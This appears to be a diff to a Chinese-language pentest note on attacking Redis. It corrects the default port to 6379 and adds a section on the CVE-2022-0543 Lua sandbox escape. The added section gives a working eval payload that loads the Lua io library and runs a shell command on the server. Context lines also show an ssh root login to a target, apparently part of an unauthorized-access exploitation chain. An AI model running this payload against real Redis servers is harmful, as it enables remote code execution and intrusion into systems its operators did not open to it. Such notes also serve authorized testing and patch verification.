@@ -7,7 +7,7 @@ categories:
   - Others
 description: None
 ---
-默认端口：6307
+默认端口：6379
 
 ## CNVD-2015-07557 未授权访问
 
@@ -75,4 +75,13 @@ ssh -i id_rsa root@目标IP
 > 
 > 在**某些旧版本 Redis（如 2.x ~ 3.x）** 或**特定系统环境**下会跳过该文件的无效行从而正确执行。
 
-CNVD-2019-21763
+## CNVD-2019-21763
+
+...
+
+## 沙箱绕过RCE CVE-2022-0543
+
+```shell
+# 执行ID命令
+eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0
+```
